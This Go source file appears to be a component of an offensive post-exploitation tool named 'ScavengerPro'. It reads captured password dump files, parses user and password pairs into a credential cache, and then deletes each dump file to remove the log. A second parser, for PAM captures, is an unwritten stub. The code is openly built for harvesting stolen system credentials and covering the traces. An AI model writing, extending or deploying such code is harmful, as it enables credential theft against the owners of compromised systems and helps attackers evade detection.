// watch password dump files, parse them and return them as normalized data
// @author: degenerat3

package main

import (
	"ScavengerPro/client/cred_cache"
	"bufio"
	"os"
	"strings"
)

// take file list in form: ["filename:parser" "file2:parser2"...]
func checkFiles(files []string, c *cred_cache.CredCache) {
	for _, f := range files {
		if strings.Contains(f, "def") {
			defaultParse(f, c)
		}
		if strings.Contains(f, "pam") {
			pamParse(f, c)
		}
	}
}

func defaultParse(fi string, c *cred_cache.CredCache) []string {
	var res []string
	fname := strings.Split(fi, ":")[0]
	f, _ := os.Open(fname)
	defer f.Close()
	var lines []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	for _, ln := range lines {
		sp := strings.SplitN(ln, ":", 2)
		typ := "system"
		user := sp[0]
		pass := sp[1]
		fin := typ + ":" + user + ":" + pass
		res = append(res, fin)
		c.AddEntry(fin)
	}
	os.Remove(fname) // get rid of cred log file
	return nil
}

func pamParse(f string, c *cred_cache.CredCache) []string {
	//TODO: write the PAM parser
	return nil
}
